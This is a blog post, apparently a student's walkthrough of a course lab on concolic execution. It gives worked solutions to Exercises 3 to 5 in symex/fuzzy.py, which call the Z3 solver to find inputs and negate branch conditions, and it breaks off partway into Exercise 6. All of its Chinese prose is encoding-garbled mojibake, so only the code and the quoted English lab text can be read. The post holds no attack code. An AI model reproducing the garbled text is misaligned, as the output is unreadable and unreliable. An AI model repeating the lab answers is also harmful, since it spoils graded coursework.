<p>æˆ‘ä»¬æ¥ä¸‹æ¥æ¥çœ‹  <code>check-symex-int.py</code> ï¼Œå…¶å¼€å¤´çš„é€»è¾‘å¦‚ä¸‹ï¼Œ<code>r</code> çš„å€¼ä¸º 1234 å³å¯é€šè¿‡ Exercise 3ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## This test case checks that you provided the right input in symex_exercises.</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calling f with a specific input..&#x27;</span>)<br>v = symex_exercises.make_a_test_case()<br>(r, constr, callers) = fuzzy.concolic_exec_input(test_f, v, verbose=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> r == <span class="hljs-number">1234</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found input for 1234&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Input produced&quot;</span>, r, <span class="hljs-string">&quot;instead of 1234&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>å¦‚å‰é¢æˆ‘ä»¬å¯¹ <code>concolic_exec_input()</code> çš„åˆ†æï¼Œ<code>r</code> çš„å€¼ç”±ä¼ å…¥çš„å‡½æ•°æŒ‡é’ˆå†³å®šï¼Œæ•…æˆ‘ä»¬æ¥çœ‹ <code>test_f()</code> çš„é€»è¾‘ï¼Œä¸»è¦å°±æ˜¯ç”¨ <code>mk_int()</code> ä»å…¨å±€å…·ä½“å€¼å­—å…¸ä¸­è·å– id ä¸º <code>i</code> çš„å€¼ä¼ å…¥ <code>f()</code> ä¸­è¿›è¡Œè¿ç®—ï¼Œè‹¥ä¸å­˜åœ¨ <code>i</code> åˆ™ <code>i</code> ä¼šè¢«é»˜è®¤èµ‹å€¼ <code>0</code> ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">if</span> x == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">100</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == x+<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">70</span><br>    <span class="hljs-keyword">if</span> x &gt; <span class="hljs-number">2000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">80</span><br>    <span class="hljs-keyword">if</span> x*<span class="hljs-number">2</span> == <span class="hljs-number">1000</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">30000</span><br>    <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">500</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">33</span><br>    <span class="hljs-keyword">if</span> x // <span class="hljs-number">123</span> == <span class="hljs-number">7</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1234</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">40</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_f</span>():<br>    i = fuzzy.mk_int(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">0</span>)<br>    v = f(i)<br>    <span class="hljs-keyword">return</span> v<br></code></pre></td></tr></table></figure>

<p>ç”±å‡½æ•° <code>f()</code> æˆ‘ä»¬å¯ä»¥çŸ¥é“çš„æ˜¯æˆ‘ä»¬åªéœ€è¦å‘å…·ä½“å€¼å­—å…¸ä¸­æ·»åŠ ä¸€ä¸ª <code>i = 123 * 7</code> çš„å€¼å³å¯è®© <code>test_f()</code> è¿”å› <code>1234</code>ï¼Œæ•…ä¿®æ”¹ <code>symex_exercises.py</code> å¦‚ä¸‹ï¼Œè¿™é‡Œç”¨ <code>mk_int()</code> å’Œ <code>add()</code> éƒ½å¯ä»¥ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> symex.fuzzy <span class="hljs-keyword">as</span> fuzzy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_a_test_case</span>():<br>  concrete_values = fuzzy.ConcreteValues()<br>  <span class="hljs-comment">## Your solution here: add the right value to concrete_values</span><br>  concrete_values.add(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-number">123</span> * <span class="hljs-number">7</span>)<br>  <span class="hljs-keyword">return</span> concrete_values<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œï¼ŒæˆåŠŸé€šè¿‡ Exercise 3ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/18/f3HsgQFum1CZDij.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¥ä¸‹æ¥æ˜¯ Exercise 4ï¼Œå®Œæˆ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_find_input</code>  çš„å®ç°ï¼š</p>
<blockquote>
<p><strong>Exercise 4.</strong> Another major component in concolic execution is finding a concrete input for a constraint. Complete the implementation of <code>concolic_find_input</code> in <code>symex/fuzzy.py</code> and make sure you pass the second test case of <code>symex/check-symex-int.py</code>. For this exercise, you will have to invoke Z3, along the lines of <code>(ok, model) = fork_and_check(constr)</code> (see the comments in the code). Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p>
</blockquote>
<p>åœ¨è¯¥å‡½æ•°å½“ä¸­æˆ‘ä»¬éœ€è¦å®Œæˆå¯¹çº¦æŸçš„æ±‚è§£å¹¶è¿”å›å¯¹åº”çš„ç»“æœï¼Œå› æ­¤è¿™é‡Œéœ€è¦ä½¿ç”¨ Z3 æ±‚è§£å™¨æ¥å®Œæˆçº¦æŸæ±‚è§£è¿‡ç¨‹ï¼Œä¸è¿‡è¿™é‡Œå·²ç»å°†è°ƒç”¨ Z3 çš„æµç¨‹åœ¨ <code>fork_and_check()</code> ä¸­å®Œæˆå°è£…ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨è¯¥å‡½æ•°è¿›è¡Œæ±‚è§£å³å¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæ¥çœ‹  <code>fork_and_check()</code> çš„å…·ä½“å®ç°ï¼š</p>
<ul>
<li>åˆ›å»ºå­è¿›ç¨‹è°ƒç”¨ <code>fork_and_check_worker()</code> è¿›è¡Œçº¦æŸæ±‚è§£ï¼Œçˆ¶å­è¿›ç¨‹é€šè¿‡ç®¡é“é€šä¿¡</li>
<li>çˆ¶è¿›ç¨‹ç­‰å¾…å­è¿›ç¨‹çš„ <code>SIGALRM</code> ä¿¡å·ï¼Œè‹¥ <code>z3_timeout</code> ç§’åæœªæ”¶åˆ°ï¼Œæ€æ­»å­è¿›ç¨‹</li>
<li>ä»ç®¡é“æ¥æ”¶ç»“æœå¹¶è¿”å›ï¼Œè‹¥è¶…æ—¶ï¼ˆå­è¿›ç¨‹è¢«æ€ï¼Œç®¡é“å…³é—­ï¼‰åˆ™è¿”å› <code>(z3.unknown, None)</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Support for forking because z3 uses lots of global variables</span><br><br><span class="hljs-comment">## timeout for Z3, in seconds</span><br>z3_timeout = <span class="hljs-number">5</span><br><br><span class="hljs-comment">##...</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check</span>(<span class="hljs-params">constr</span>):<br>  constr = simplify(constr)<br><br>  parent_conn, child_conn = multiprocessing.Pipe()<br>  p = multiprocessing.Process(target=fork_and_check_worker,<br>                              args=(constr, child_conn))<br>  p.start()<br>  child_conn.close()<br><br>  <span class="hljs-comment">## timeout after a while..</span><br>  <span class="hljs-keyword">def</span> <span class="hljs-title function_">sighandler</span>(<span class="hljs-params">signo, stack</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Timed out..&quot;</span>)<br>    <span class="hljs-comment"># print z3expr(constr).sexpr()</span><br>    p.terminate()<br><br>  signal.signal(signal.SIGALRM, sighandler)<br>  signal.alarm(z3_timeout)<br><br>  <span class="hljs-keyword">try</span>:<br>    res = parent_conn.recv()<br>  <span class="hljs-keyword">except</span> EOFError:<br>    res = (z3.unknown, <span class="hljs-literal">None</span>)<br>  <span class="hljs-keyword">finally</span>:<br>    signal.alarm(<span class="hljs-number">0</span>)<br><br>  p.join()<br>  <span class="hljs-keyword">return</span> res<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥çœ‹   <code>fork_and_check_workder()</code> çš„å…·ä½“å®ç°ï¼š</p>
<ul>
<li>æ–°å»ºä¸€ä¸ª Z3 æ±‚è§£å™¨å°†è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„çº¦æŸè¡¨è¾¾å¼ä¼ å…¥ï¼Œè°ƒç”¨ <code>Solver.check()</code> æ±‚è§£</li>
<li>è‹¥æ±‚è§£æˆåŠŸï¼Œè°ƒç”¨ <code>Solver.model()</code> è·å¾—æ±‚è§£ç»“æœ</li>
<li>åˆ¤æ–­ç»“æœä¸­å˜é‡ç±»å‹å¹¶è½¬æ¢ä¸ºæ•´å‹&#x2F;å­—ç¬¦ä¸²ï¼Œå¯¹äºå­—ç¬¦ä¸²åšé¢å¤–å¤„ç†ï¼Œå°†ç»“æœæ”¾åˆ°ä¸€ä¸ª <code>å­—ç¬¦ä¸²â†’ç»“æœ</code> æ˜ å°„çš„å­—å…¸ä¸­å¹¶è¿”å›</li>
</ul>
<blockquote>
<p>Z3 è¿™ç©æ„ç”¨èµ·æ¥ç¡®å®æ–¹ä¾¿ï¼Œä¸æ„§æ˜¯å¾®è½¯<del>å¤§çˆ¹</del></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fork_and_check_worker</span>(<span class="hljs-params">constr, conn</span>):<br>  s = z3.Solver()<br>  s.add(z3expr(constr))<br>  ok = s.check()<br>  m = &#123;&#125;<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    z3m = s.model()<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> z3m:<br>      v = z3m[k]<br>      <span class="hljs-keyword">if</span> v.sort() == z3.IntSort():<br>        m[<span class="hljs-built_in">str</span>(k)] = v.as_long()<br>      <span class="hljs-keyword">elif</span> v.sort() == z3.StringSort():<br>        <span class="hljs-comment">## There doesn&#x27;t seem to be a way to get the raw string</span><br>        <span class="hljs-comment">## value out of Z3..  Instead, we get the escaped string</span><br>        <span class="hljs-comment">## value.  We need to jump through hoops to unescape it.</span><br>        x = v.as_string()<br>        u = x.encode(<span class="hljs-string">&#x27;latin1&#x27;</span>).decode(<span class="hljs-string">&#x27;unicode-escape&#x27;</span>)<br>        m[<span class="hljs-built_in">str</span>(k)] = u<br>      <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Unknown sort for %s=%s: %s&quot;</span> % (k, v, v.sort()))<br>  conn.send((ok, m))<br>  conn.close()<br></code></pre></td></tr></table></figure>

<p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å¯ä»¥å®Œæˆ Exercise 4 äº†ï¼Œæˆ‘ä»¬åªéœ€è¦è°ƒç”¨  <code>fork_and_check()</code> è¿›è¡Œæ±‚è§£å³å¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬è¿”å›çš„å­—å…¸ä¸­çš„é”®å€¼å¯¹åº”å½“åªåŒ…å« <code>ok_names</code> å‚æ•°ä¸­æ‰€éœ€è¦çš„é”®ï¼Œè‹¥ <code>ok_names == None</code> åˆ™å°†æ‰€æœ‰çš„é”®å€¼å¯¹æ·»åŠ åˆ°å­—å…¸ä¸­ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Given a constraint, ask Z3 to compute concrete values that make that</span><br><span class="hljs-comment"># constraint true. It returns a new ConcreteValues instance with those</span><br><span class="hljs-comment"># values.  Z3 produces variables that don&#x27;t show up in our</span><br><span class="hljs-comment"># applications and in our constraints; we filter those by accepting</span><br><span class="hljs-comment"># only variables names that appear in ok_names.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_find_input</span>(<span class="hljs-params">constraint, ok_names, verbose=<span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## Invoke Z3, along the lines of:</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">##     (ok, model) = fork_and_check(constr)</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## If Z3 was able to find example inputs that solve this</span><br>  <span class="hljs-comment">## constraint (i.e., ok == z3.sat), make a new input set</span><br>  <span class="hljs-comment">## containing the values from Z3&#x27;s model, and return it.</span><br>  (ok, model) = fork_and_check(constraint)<br>  cv = ConcreteValues()<br>  <span class="hljs-keyword">if</span> ok == z3.sat:<br>    sat = <span class="hljs-literal">True</span><br>    res_names = model.keys() <span class="hljs-keyword">if</span> ok_names <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> ok_names<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> res_names:<br>      cv.add(k, model[k])<br>  <span class="hljs-keyword">else</span>:<br>    sat = <span class="hljs-literal">False</span><br>  <span class="hljs-keyword">return</span> sat, cv<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸé€šè¿‡ Exercise 4ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/18/NJ32G9ogzOCEbPA.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ç„¶åæ˜¯ Exercise 5ï¼Œ å®Œæˆ <code>symex/fuzzy.py</code> ä¸­ <code>concolic_force_branch</code>  çš„å®ç°ï¼š</p>
<blockquote>
<p>æå‰è¯´ä¸€ä¸‹ï¼Œè¿™ä¸ª Exercise 5 çš„æ£€æŸ¥<strong>éå¸¸æ¾</strong>ï¼Œä¸è¦ä»¥ä¸ºé€šè¿‡æ£€æŸ¥å°±æ˜¯çœŸçš„ Pass äº†ï¼Œæœ€å¥½è‡ªå·±å†çœ‹çœ‹ä»£ç é€»è¾‘æ˜¯å¦ç¬¦åˆè¦æ±‚â€¦</p>
</blockquote>
<blockquote>
<p><strong>Exercise 5.</strong> A final major component in concolic execution is exploring different branches of execution. Complete the implementation of <code>concolic_force_branch</code> in <code>symex/fuzzy.py</code> and make sure you pass the final test case of <code>symex/check-symex-int.py</code>. Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check your solution.</p>
</blockquote>
<p>æ­£å¦‚å‰æ–‡æ‰€è¯´ï¼Œåœ¨é‡åˆ°åˆ†æ”¯æ—¶æˆ‘ä»¬éœ€è¦<strong>é€†è½¬å½“å‰åˆ†æ”¯æ¡ä»¶ï¼Œä»¥æ¢ç´¢å¦ä¸€åˆ†æ”¯</strong>ï¼Œè¯¥å‡½æ•°çš„ä½œç”¨å®é™…ä¸Šå°±æ˜¯é€†è½¬ <code>branch_conds</code> ä¸­çš„ç¬¬ <code>b</code> åˆ†æ”¯çš„æ¡ä»¶ï¼Œå¹¶è¿”å›æ–°çš„çº¦æŸæ¡ä»¶é›†åˆï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦å–å‡ºè¯¥æ¡ä»¶å¹¶ä½¿ç”¨ <code>sym_not()</code> å–ååå†ç”¨ <code>sym_and()</code> åŠ ä¸Šè¯¥åˆ†æ”¯ä¹‹å‰æ‰€æœ‰çš„æ¡ä»¶çº¦æŸå³å¯</p>
<p>æ³¨æ„è¿™é‡Œçš„å‚æ•° <code>b</code> ä¸ºåˆ†æ”¯æ ‡å·ï¼Œ<code>branch_conds</code> ä¸ <code>branch_callers</code> ä¸ºåˆ†æ”¯çš„æ¡ä»¶ä¸è°ƒç”¨è€…æ•°ç»„ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Compute a new constraint by negating the branch condition of the</span><br><span class="hljs-comment"># b-th branch in branch_conds. This constraint can be used to force</span><br><span class="hljs-comment"># the concolic execution to explore the other side of branch b.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_force_branch</span>(<span class="hljs-params">b, branch_conds, branch_callers, verbose = <span class="hljs-number">1</span></span>):<br>  <span class="hljs-comment">## Compute an AST expression for the constraints necessary</span><br>  <span class="hljs-comment">## to go the other way on branch b.  You can use existing</span><br>  <span class="hljs-comment">## logical AST combinators like sym_not(), sym_and(), etc.</span><br>  <span class="hljs-comment">##</span><br>  <span class="hljs-comment">## Note that some of the AST combinators take separate positional</span><br>  <span class="hljs-comment">## arguments. In Python, to unpack a list into separate positional</span><br>  <span class="hljs-comment">## arguments, use the &#x27;*&#x27; operator documented at</span><br>  <span class="hljs-comment">## https://docs.python.org/3/tutorial/controlflow.html#unpacking-argument-lists</span><br><br>  constraint = <span class="hljs-literal">None</span><br>  <span class="hljs-comment">## Exercise 5 by arttnba3</span><br>  <span class="hljs-comment">### negating the branch condition of the b-th branch</span><br>  b_cond = branch_conds[b]<br>  <span class="hljs-keyword">if</span> (b_cond != const_bool(<span class="hljs-literal">True</span>)):<br>    constraint = sym_not(b_cond)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(b):<br>      constraint = sym_and(constraint, branch_conds[i])<br>  <span class="hljs-comment">### end</span><br><br>  <span class="hljs-keyword">if</span> verbose &gt; <span class="hljs-number">2</span>:<br>    callers = branch_callers[b]<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Trying to branch at %s:%d:&#x27;</span> % (callers[<span class="hljs-number">0</span>], callers[<span class="hljs-number">1</span>]))<br>    <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>      <span class="hljs-built_in">print</span>(indent(z3expr(constraint).sexpr()))<br><br>  <span class="hljs-keyword">if</span> constraint <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">return</span> const_bool(<span class="hljs-literal">True</span>)<br>  <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> constraint<br></code></pre></td></tr></table></figure>

<p>æˆåŠŸé€šè¿‡ Exercise 5ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/18/dFbaOHEoCXG23L6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æœ€åæ˜¯ Exercise 6ï¼Œ <strong>ä½¿ç”¨æˆ‘ä»¬åœ¨ Exercise 3-5 ä¸­æ¶‰åŠçš„å‡ ä¸ªå‡½æ•°æ¥å®Œæˆ <code>concolic_execs()</code>â€”â€” å®Œæ•´çš„æ··åˆæ‰§è¡Œå‡½æ•°çš„æ„å»º</strong>ï¼Œæˆ‘ä»¬éœ€è¦å®Œæˆå¯¹ <code>func</code> ä¸­çš„<strong>æ¯ä¸€æ¡åˆ†æ”¯</strong>çš„æ‰§è¡Œï¼š</p>
<blockquote>
<p><strong>Exercise 6.</strong> Now implement concolic execution of a function in <code>concolic_execs()</code> in <code>symex/fuzzy.py</code>. The goal is to eventually cause every every branch of <code>func</code>to be executed. Read the comment for a proposed plan of attack for implementing that loop. The functions in the exercises 3-5 should be quite useful.</p>
<p>Run <strong>.&#x2F;check-symex-int.py</strong> or <strong>make check</strong> to check that your <code>concolic_execs()</code> works correctly.</p>
<p>Beware that our check for this exercise is <em>not</em> complete. You may well find that later on something does not work, and you will have to revisit your code for this exercise.</p>
</blockquote>
<p>æˆ‘ä»¬å…ˆçœ‹ <code>concolic_execs()</code> ä¸­å·²æœ‰çš„é€»è¾‘æ¡†æ¶ï¼š</p>
<ul>
<li><code>checked</code> ä¸ºå·²ç»æ£€æŸ¥è¿‡çš„çº¦æŸï¼Œ<code>outs</code> ä¸ºæœ€åæ±‚è§£æ‰€å¾—ç»“æœï¼Œ<code>inputs</code> ä¸ºå¾…æµ‹è¯•è¾“å…¥é˜Ÿåˆ—ï¼ˆè¾“å…¥ä¸ºå…·ä½“å€¼å­—å…¸ï¼‰</li>
<li>ç”±ä¸€ä¸ªå¤§å¾ªç¯æŒç»­è°ƒç”¨<code>concolic_exec_input()</code> è®¡ç®—çº¦æŸ</li>
<li>å°†æ–°çš„çº¦æŸè§£æ·»åŠ åˆ°ç»“æœä¸­</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Concolic execute func for many different paths and return all</span><br><span class="hljs-comment"># computed results for those different paths.</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">concolic_execs</span>(<span class="hljs-params">func, maxiter = <span class="hljs-number">100</span>, verbose = <span class="hljs-number">0</span></span>):<br>  <span class="hljs-comment">## &quot;checked&quot; is the set of constraints we already sent to Z3 for</span><br>  <span class="hljs-comment">## checking.  use this to eliminate duplicate paths.</span><br>  checked = <span class="hljs-built_in">set</span>()<br><br>  <span class="hljs-comment">## output values</span><br>  outs = []<br><br>  <span class="hljs-comment">## list of inputs we should try to explore.</span><br>  inputs = InputQueue()<br><br>  <span class="hljs-built_in">iter</span> = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">while</span> <span class="hljs-built_in">iter</span> &lt; maxiter <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> inputs.empty():<br>    <span class="hljs-built_in">iter</span> += <span class="hljs-number">1</span><br>    concrete_values = inputs.get()<br>    (r, branch_conds, branch_callers) = concolic_exec_input(func, concrete_values, verbose)<br>    <span class="hljs-keyword">if</span> r <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> outs:<br>      outs.append(r)<br>    <br>    <span class="hljs-comment">## Exercise 6: your code here.</span><br></code></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çš„ä»£ç éœ€è¦æ·»åŠ åœ¨å¤§å¾ªç¯çš„ååŠéƒ¨åˆ†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆå›é¡¾ä¸€ä¸‹åœ¨ Exercise 3-5 ä¸­æˆ‘ä»¬éƒ½è·å¾—äº†å“ªäº›å¯ç”¨å‡½æ•°ï¼š</p>
<ul>
<li><code>concolic_exec_input(testfunc, concrete_values, verbose = 0)</code>ï¼šå°† <code>concrete_values</code> å‚æ•°è®¾ä¸ºå…¨å±€å­—å…¸ï¼Œä¹‹åæ‰§è¡Œç»™å®šçš„å‡½æ•° <code>testfunc</code>ï¼Œè¿”å›æ‰§è¡Œçš„ç»“æœå€¼ã€åˆ†æ”¯æ¡ä»¶åˆ—è¡¨ã€åˆ†æ”¯è°ƒç”¨ä¿¡æ¯åˆ—è¡¨</li>
<li><code>concolic_find_input(constraint, ok_names, verbose=0)</code>ï¼šä½¿ç”¨ Z3 æ±‚è§£ç»™å®šçº¦æŸï¼Œè¿”å› <code>ok_names</code> åˆ—è¡¨ä¸­å˜é‡çš„å€¼</li>
<li><code>concolic_force_branch(b, branch_conds, branch_callers, verbose = 1)</code>ï¼šå¯¹ç»™å®šçº¦æŸæ¡ä»¶ <code>branch_conds</code> ä¸åˆ†æ”¯ <code>b</code>ï¼Œè¿”å›èµ°å‘è¯¥åˆ†æ”¯å¦ä¸€è·¯å¾„çš„çº¦æŸ</li>
</ul>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ Lab ç»™çš„æç¤ºä¿¡æ¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Exercise 6: your code here.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Here&#x27;s a possible plan of attack:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Iterate over the set of branches returned by concolic_exec_input.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_force_branch() to construct a constraint over</span><br><span class="hljs-comment">##   the inputs for taking the other side of that branch.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - If this constraint is already in the &quot;checked&quot; set, skip</span><br><span class="hljs-comment">##   it (otherwise, add it to prevent further duplicates).</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Use concolic_find_input() to construct a new input to test,</span><br><span class="hljs-comment">##   based on the above constraint.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Since Z3 might not assign values to every variable</span><br><span class="hljs-comment">##   (such as if that variable turns out to be irrelevant to</span><br><span class="hljs-comment">##   the overall constraint), inherit unassigned values from</span><br><span class="hljs-comment">##   the input that we just tried (i.e., concrete_values).</span><br><span class="hljs-comment">##   You can use the inherit() method in ConcreteValues for this.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## - Add the input to the queue for processing, along the lines of:</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##     inputs.add(new_values, caller)</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">##   where caller is the corresponding value from the list of call</span><br><span class="hljs-comment">##   sites returned by concolic_find_input (i.e., branch_callers).</span><br></code></pre></td></tr></table></figure>

<ul>
<li>è¿­ä»£ <code>concolic_exec_input()</code> æ‰€è¿”å›çš„åˆ†æ”¯é›†åˆ</li>
